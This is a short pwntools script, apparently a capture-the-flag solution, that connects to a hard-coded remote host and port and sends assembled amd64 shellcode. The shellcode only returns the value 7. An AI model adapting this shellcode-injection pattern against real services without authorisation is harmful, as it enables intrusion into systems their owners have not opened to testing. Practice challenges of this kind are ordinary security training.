from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='amd64')

s = remote('157.245.88.100',7778)

shellcode = b''
shellcode = asm(shellcraft.amd64.ret(7))

s.sendline(shellcode)
print(s.recvline().decode())
